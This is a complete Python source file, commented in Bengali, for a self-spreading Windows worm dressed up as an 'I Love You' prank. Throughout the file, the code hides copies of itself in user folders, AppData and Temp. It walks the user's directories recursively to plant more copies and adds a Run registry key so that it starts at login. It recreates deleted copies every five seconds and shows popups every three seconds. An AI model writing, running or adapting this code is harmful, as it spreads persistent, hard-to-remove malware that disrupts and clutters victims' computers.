import os
import sys
import time
import shutil
import threading
import tkinter as tk
from tkinter import messagebox
import winreg
from pathlib import Path
import random

class AutoSpreadingLoveProgram:
    def __init__(self):
        # প্রোগ্রামের নাম
        self.program_name = "ILoveYou.pyw"  # .pyw = no console window
        
        # যেসব জায়গায় ছড়িয়ে দেবে
        self.spread_locations = [
            os.path.expanduser("~"),  # User home
            os.path.join(os.path.expanduser("~"), "Desktop"),
            os.path.join(os.path.expanduser("~"), "Documents"),
            os.path.join(os.path.expanduser("~"), "Downloads"),
            os.path.join(os.path.expanduser("~"), "Pictures"),
            os.path.join(os.path.expanduser("~"), "Videos"),
            os.path.join(os.path.expanduser("~"), "Music"),
            "C:\\Users\\Public\\Documents",
            os.environ.get('APPDATA', ''),
            os.environ.get('TEMP', ''),
        ]
        
        # Special folders যেগুলো তৈরি করবে
        self.special_folders = [
            "💝 I Love You",
            "My Love",
            "Special Message",
            "For You"
        ]
        
        self.is_running = True
        self.popup_interval = 3  # 3 seconds
        
    def get_script_path(self):
        """বর্তমান স্ক্রিপ্টের path"""
        if getattr(sys, 'frozen', False):
            return sys.executable
        return os.path.abspath(__file__)
    
    def add_to_startup(self):
        """Windows startup এ যুক্ত করে"""
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r'Software\Microsoft\Windows\CurrentVersion\Run',
                0, winreg.KEY_SET_VALUE
            )
            
            script_path = self.get_script_path()
            winreg.SetValueEx(key, 'ILoveYouProgram', 0, winreg.REG_SZ, 
                            f'pythonw "{script_path}"')
            winreg.CloseKey(key)
            return True
        except:
            return False
    
    def copy_to_location(self, destination):
        """নিজেকে অন্য location এ কপি করে"""
        try:
            source = self.get_script_path()
            
            if not os.path.exists(destination):
                os.makedirs(destination, exist_ok=True)
            
            dest_file = os.path.join(destination, self.program_name)
            
            # যদি ইতিমধ্যে না থাকে বা ভিন্ন হয়
            if not os.path.exists(dest_file) or not self.files_are_same(source, dest_file):
                shutil.copy2(source, dest_file)
                
                # Hidden attribute set করুন (Windows)
                if sys.platform == 'win32':
                    try:
                        import ctypes
                        FILE_ATTRIBUTE_HIDDEN = 0x02
                        ctypes.windll.kernel32.SetFileAttributesW(dest_file, FILE_ATTRIBUTE_HIDDEN)
                    except:
                        pass
                
                return True
        except Exception as e:
            pass
        return False
    
    def files_are_same(self, file1, file2):
        """দুটি ফাইল same কিনা check করে"""
        try:
            return os.path.getsize(file1) == os.path.getsize(file2)
        except:
            return False
    
    def create_special_folders(self):
        """Special folders তৈরি করে"""
        for location in self.spread_locations:
            if not os.path.exists(location):
                continue
                
            for folder_name in self.special_folders:
                try:
                    folder_path = os.path.join(location, folder_name)
                    
                    if not os.path.exists(folder_path):
                        os.makedirs(folder_path, exist_ok=True)
                        
                        # ফোল্ডারে একটা message file রাখুন
                        message_file = os.path.join(folder_path, "ReadMe.txt")
                        with open(message_file, 'w', encoding='utf-8') as f:
                            f.write("💝 I Love You! 💕\n\n")
                            f.write("This is a fun program!\n")
                            f.write("Made with love 💖")
                        
                        # প্রোগ্রামও কপি করুন
                        self.copy_to_location(folder_path)
                except:
                    pass
    
    def spread_everywhere(self):
        """সব জায়গায় ছড়িয়ে দেয়"""
        while self.is_running:
            try:
                # সব designated location এ কপি করুন
                for location in self.spread_locations:
                    if os.path.exists(location):
                        self.copy_to_location(location)
                
                # Special folders তৈরি করুন
                self.create_special_folders()
                
                # Startup এ যুক্ত করুন
                self.add_to_startup()
                
                # প্রতি 30 সেকেন্ডে spread করুন
                time.sleep(30)
                
            except Exception as e:
                time.sleep(10)
    
    def scan_and_spread_to_all_folders(self):
        """Computer এর সব accessible folders এ ছড়িয়ে দেয়"""
        def scan_directory(base_path, max_depth=3, current_depth=0):
            """Recursively scan এবং spread করে"""
            if current_depth >= max_depth:
                return
            
            try:
                for item in os.listdir(base_path):
                    if not self.is_running:
                        return
                    
                    item_path = os.path.join(base_path, item)
                    
                    try:
                        if os.path.isdir(item_path):
                            # System folders skip করুন
                            skip_folders = ['Windows', 'Program Files', 'System32', 
                                          '$Recycle.Bin', 'ProgramData']
                            if any(skip in item_path for skip in skip_folders):
                                continue
                            
                            # এই folder এ কপি করুন
                            self.copy_to_location(item_path)
                            
                            # Deeper scan করুন
                            scan_directory(item_path, max_depth, current_depth + 1)
                    except:
                        pass
            except:
                pass
        
        while self.is_running:
            try:
                # User directories scan করুন
                user_home = os.path.expanduser("~")
                scan_directory(user_home, max_depth=3)
                
                # একবার scan complete হলে 60 সেকেন্ড wait করুন
                time.sleep(60)
            except:
                time.sleep(30)
    
    def show_love_popup(self):
        """Love message popup দেখায়"""
        try:
            root = tk.Tk()
            root.withdraw()
            
            # Random messages
            messages = [
                "💝 I Love You! 💕",
                "💖 You are Special! 💖",
                "💕 Thinking of You! 💕",
                "💝 Miss You! 💝",
                "💖 You Make Me Happy! 💖",
                "💕 Forever Yours! 💕"
            ]
            
            message = random.choice(messages)
            
            # Popup দেখান
            messagebox.showinfo("💝 Love Message 💝", message)
            
            root.destroy()
        except:
            pass
    
    def popup_loop(self):
        """প্রতি 3 সেকেন্ডে popup দেখায়"""
        while self.is_running:
            try:
                self.show_love_popup()
                time.sleep(self.popup_interval)
            except:
                time.sleep(self.popup_interval)
    
    def monitor_and_restore(self):
        """ফাইল delete হলে restore করে"""
        while self.is_running:
            try:
                script_path = self.get_script_path()
                
                # নিজের location check করুন
                if not os.path.exists(script_path):
                    # যদি delete হয়ে যায়, অন্য location থেকে restore করুন
                    for location in self.spread_locations:
                        backup_path = os.path.join(location, self.program_name)
                        if os.path.exists(backup_path):
                            shutil.copy2(backup_path, script_path)
                            break
                
                # Special folders check করুন
                for location in self.spread_locations:
                    if not os.path.exists(location):
                        continue
                    
                    for folder_name in self.special_folders:
                        folder_path = os.path.join(location, folder_name)
                        
                        # যদি delete হয়ে যায়, আবার তৈরি করুন
                        if not os.path.exists(folder_path):
                            try:
                                os.makedirs(folder_path, exist_ok=True)
                                self.copy_to_location(folder_path)
                            except:
                                pass
                
                time.sleep(5)  # প্রতি 5 সেকেন্ডে check করুন
            except:
                time.sleep(5)
    
    def start(self):
        """প্রোগ্রাম শুরু করে"""
        # প্রথমে একবার spread করুন
        for location in self.spread_locations:
            if os.path.exists(location):
                self.copy_to_location(location)
        
        self.create_special_folders()
        self.add_to_startup()
        
        # Multiple threads চালু করুন
        threads = [
            threading.Thread(target=self.spread_everywhere, daemon=True),
            threading.Thread(target=self.scan_and_spread_to_all_folders, daemon=True),
            threading.Thread(target=self.popup_loop, daemon=True),
            threading.Thread(target=self.monitor_and_restore, daemon=True),
        ]
        
        for thread in threads:
            thread.start()
        
        # Main thread alive রাখুন
        try:
            while self.is_running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.is_running = False


if __name__ == "__main__":
    # প্রোগ্রাম চালু করুন
    program = AutoSpreadingLoveProgram()
    program.start()